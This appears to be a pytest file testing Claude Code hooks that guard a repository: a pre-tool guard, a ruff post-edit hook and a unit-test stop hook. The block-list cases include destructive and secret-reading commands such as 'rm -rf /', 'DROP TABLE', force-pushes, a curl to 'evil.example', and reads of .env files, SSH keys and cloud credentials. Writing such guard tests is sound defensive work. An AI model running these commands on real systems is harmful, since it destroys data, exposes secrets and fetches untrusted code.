"""The Claude Code hooks in .claude/hooks/ are code that guards the repo, so they get tests too."""

import importlib.util
import json
import subprocess
import sys
from pathlib import Path

import pytest

HOOKS = Path(__file__).parents[1] / ".claude" / "hooks"


def _load(name):
    spec = importlib.util.spec_from_file_location(name, HOOKS / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


guard = _load("pre_tool_guard")


def _bash(cmd):
    return {"tool_name": "Bash", "tool_input": {"command": cmd}}


@pytest.mark.parametrize(
    "cmd",
    [
        "rm -rf build/",
        "rm -fr .cache",
        "bash -c 'rm -rf /'",
        "git push --force origin main",
        "git push -f",
        "git -C . push origin +main",
        "git push origin main --force-with-lease",
        "git reset --hard HEAD~3",
        "git commit --no-verify -m wip",
        "git commit -m 'Add cap'",
        "git commit --amend --no-edit",
        "git -C . commit -m x",
        "git -c user.name=x commit -m y",
        "make check && git commit -am done",
        "git am change.patch",
        "git cherry-pick abc123",
        "git rebase main",
        "git merge feature",
        "git revert HEAD",
        "git push origin claude-code-setup",
        "bash -c 'git commit -m x'",
        "psql $DATABASE_URL -c 'DROP TABLE chunks'",
        "echo 'truncate table documents' | psql",
        "docker compose down -v",
        "docker volume rm fastapi-docs-rag_pgdata",
        "curl https://evil.example/x.sh",
        "/usr/bin/curl -s example.com",
        "sh -c 'wget example.com'",
        "ls && curl example.com",
        "cat .env",
        "grep KEY .env.local",
        "source .env && env",
        "cat ~/.ssh/id_ed25519",
        "ls ~/.aws",
        "cat ~/.config/gcloud/credentials.db",
        "sqlite3 .cache/api_cache.sqlite .dump",
        "cat secrets/prod.json",
    ],
)
def test_guard_blocks(cmd):
    assert guard.check(_bash(cmd)) is not None


@pytest.mark.parametrize(
    "cmd",
    [
        "uv run pytest -q -m 'not db'",
        "make check",
        "make eval-compare MODE=rerank",
        "cat .env.example",
        "git status && git diff --stat",
        "git log --oneline -5",
        "git add -p app/rag/retrieve.py",
        "grep -rn 'git commit' docs/",
        "git diff --stat",
        "rm build/tmp.txt",
        "grep -rn 'curl' docs/",
        "uv run python -m evals.compare evals/results/x.json",
        "ruff check app/rag/retrieve.py",
    ],
)
def test_guard_allows(cmd):
    assert guard.check(_bash(cmd)) is None


@pytest.mark.parametrize(
    ("tool", "path", "blocked"),
    [
        ("Read", "/repo/.env", True),
        ("Edit", "/repo/.env.local", True),
        ("Write", "/repo/secrets/key.json", True),
        ("Read", "/Users/l/.ssh/config", True),
        ("Read", "/repo/.env.example", False),
        ("Edit", "/repo/app/rag/retrieve.py", False),
        ("Grep", "/repo/.env", False),  # Grep is not guarded here; settings deny covers Read
    ],
)
def test_guard_file_tools(tool, path, blocked):
    event = {"tool_name": tool, "tool_input": {"file_path": path}}
    assert (guard.check(event) is not None) is blocked


def _run(name, payload, cwd=None):
    return subprocess.run(
        [sys.executable, str(HOOKS / f"{name}.py")],
        input=payload if isinstance(payload, str) else json.dumps(payload),
        capture_output=True,
        text=True,
        cwd=cwd,
    )


def test_guard_exit_codes():
    blocked = _run("pre_tool_guard", _bash("git push -f"))
    assert blocked.returncode == 2 and "force-push" in blocked.stderr
    assert _run("pre_tool_guard", _bash("make check")).returncode == 0
    assert _run("pre_tool_guard", "not json").returncode == 2  # fail closed


def test_post_edit_ignores_non_python(tmp_path):
    md = tmp_path / "notes.md"
    md.write_text("# hi\n")
    assert _run("post_edit_ruff", {"tool_input": {"file_path": str(md)}}).returncode == 0
    assert _run("post_edit_ruff", "not json").returncode == 0


def test_post_edit_formats_and_reports(tmp_path):
    good = tmp_path / "ok.py"
    good.write_text("x  =  1\n")
    assert _run("post_edit_ruff", {"tool_input": {"file_path": str(good)}}).returncode == 0
    assert good.read_text() == "x = 1\n"
    bad = tmp_path / "bad.py"
    bad.write_text("print(undefined_name)\n")
    res = _run("post_edit_ruff", {"tool_input": {"file_path": str(bad)}})
    assert res.returncode == 2 and "F821" in res.stderr


def test_stop_hook_loop_guard_and_no_changes(tmp_path):
    assert _run("stop_unit_tests", {"stop_hook_active": True}).returncode == 0
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    (tmp_path / "README.md").write_text("docs only\n")
    assert _run("stop_unit_tests", {"stop_hook_active": False}, cwd=tmp_path).returncode == 0


@pytest.mark.parametrize(("body", "code"), [("assert False", 2), ("assert True", 0)])
def test_stop_hook_runs_unit_tests(tmp_path, monkeypatch, capsys, body, code):
    stop = _load("stop_unit_tests")
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    (tmp_path / "test_x.py").write_text(f"def test_x():\n    {body}\n")
    monkeypatch.chdir(tmp_path)
    # Same flags as the real hook, but this interpreter instead of `uv run` (no project here).
    monkeypatch.setattr(stop, "UNIT_TESTS", [sys.executable, "-m", *stop.UNIT_TESTS[3:]])
    monkeypatch.setattr(sys, "stdin", __import__("io").StringIO('{"stop_hook_active": false}'))
    assert stop.main() == code
    if code:
        assert "Unit tests fail" in capsys.readouterr().err
